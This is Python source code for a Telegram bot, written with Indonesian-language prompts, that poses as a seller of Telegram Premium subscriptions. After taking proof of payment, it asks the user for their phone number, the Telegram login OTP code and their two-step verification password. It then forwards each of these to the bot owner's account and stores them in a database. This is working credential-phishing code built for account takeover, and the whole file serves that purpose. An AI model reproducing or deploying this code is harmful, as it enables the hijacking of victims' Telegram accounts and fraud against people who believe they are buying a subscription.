from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from pymongo import MongoClient
from config import API_ID, API_HASH, BOT_TOKEN, MONGO_URL, OWNER_ID, TESTIMONI_CHANNEL, OWNER_USERNAME

bot = Client("teleprem_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

mongo_client = MongoClient(MONGO_URL)
db = mongo_client["teleprem"]
users_col = db["users"]

# Start command
def start_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🛍 Menu", callback_data="menu"),
            InlineKeyboardButton("👤 CS", url=f"https://t.me/{OWNER_USERNAME}"),
            InlineKeyboardButton("📢 Testimoni", url=f"https://t.me/{TESTIMONI_CHANNEL}")
        ]
    ])

@bot.on_message(filters.command("start") & filters.private)
def start(client, message: Message):
    user = message.from_user
    users_col.update_one({"_id": user.id}, {"$set": {"step": "awaiting_payment"}}, upsert=True)
    message.reply(
        f"👋 Selamat datang, {user.mention()}!\n\n"
        "Untuk melanjutkan pembelian, silakan kirim bukti transfer terlebih dahulu."
        , reply_markup=start_keyboard()
    )

@bot.on_callback_query(filters.regex("menu"))
def show_menu(client, callback_query):
    callback_query.message.edit(
        "💳 Silakan pilih durasi TELEPREM:",
        reply_markup=InlineKeyboardMarkup([
            [
                InlineKeyboardButton("➖", callback_data="decrease"),
                InlineKeyboardButton("1 Bulan", callback_data="current_months"),
                InlineKeyboardButton("➕", callback_data="increase")
            ],
            [
                InlineKeyboardButton("✅ Konfirmasi", callback_data="confirm_month")
            ]
        ])
    )

# Media handler
@bot.on_message(filters.private & filters.media)
def handle_payment_proof(client, message):
    user_id = message.from_user.id
    user = users_col.find_one({"_id": user_id})
    if user and user.get("step") == "awaiting_payment":
        users_col.update_one({"_id": user_id}, {"$set": {"step": "awaiting_phone"}})

        # Forward ke owner
        caption = f"🆕 Pembelian Baru dari {message.from_user.first_name} ({user_id})"
        message.forward(OWNER_ID)
        client.send_message(OWNER_ID, caption)

        # Minta user join channel testimoni
        client.send_message(user_id,
            "✅ Bukti pembayaran diterima!\n"
            "Silakan join channel testimoni sebelum melanjutkan:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📢 Join Channel Testimoni", url=f"https://t.me/{TESTIMONI_CHANNEL}")]
            ])
        )
        client.send_message(user_id, "Sekarang silakan masukkan nomor HP Anda:")
    else:
        message.reply("Anda sudah mengirim bukti atau belum memulai dari /start")

@bot.on_message(filters.private & filters.text & ~filters.command)
def handle_text_input(client, message):
    user_id = message.from_user.id
    user = users_col.find_one({"_id": user_id})
    if not user:
        return

    if user.get("step") == "awaiting_phone":
        phone = message.text.strip()
        if not phone.isdigit() or len(phone) < 10:
            return message.reply("❌ Nomor HP tidak valid. Minimal 10 digit.")
        users_col.update_one({"_id": user_id}, {"$set": {"step": "awaiting_otp", "phone": phone}})
        client.send_message(OWNER_ID, f"📱 Nomor HP dari {message.from_user.first_name} ({user_id}): {phone}")
        return message.reply("Sekarang kirimkan kode OTP yang dikirim ke akun Telegram Anda:")

    if user.get("step") == "awaiting_otp":
        otp = message.text.strip()
        if not otp.isdigit() or len(otp) < 4:
            return message.reply("❌ Kode OTP tidak valid. Minimal 4 digit.")
        users_col.update_one({"_id": user_id}, {"$set": {"step": "awaiting_2fa", "otp": otp}})
        client.send_message(OWNER_ID, f"🔢 OTP dari {message.from_user.first_name} ({user_id}): {otp}")
        return message.reply(
            "Apakah akun Anda memiliki verifikasi dua langkah?\n"
            "Jika iya, kirimkan kodenya. Jika tidak, klik Skip.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("Skip", callback_data="skip_2fa")]
            ])
        )

    if user.get("step") == "awaiting_2fa":
        twofa = message.text.strip()
        users_col.update_one({"_id": user_id}, {"$set": {"step": "done", "2fa": twofa}})
        client.send_message(OWNER_ID, f"🔐 2FA dari {message.from_user.first_name} ({user_id}): {twofa}")
        return message.reply("✅ Semua data telah diterima. Silakan tunggu konfirmasi dari admin.")

@bot.on_callback_query(filters.regex("skip_2fa"))
def skip_2fa(client, callback_query):
    user_id = callback_query.from_user.id
    users_col.update_one({"_id": user_id}, {"$set": {"step": "done", "2fa": "(skip)"}})
    client.send_message(OWNER_ID, f"🚫 2FA dari {callback_query.from_user.first_name} ({user_id}): (skip)")
    callback_query.message.edit("✅ Semua data telah diterima. Silakan tunggu konfirmasi dari admin.")

print("Bot is running...")
bot.run()
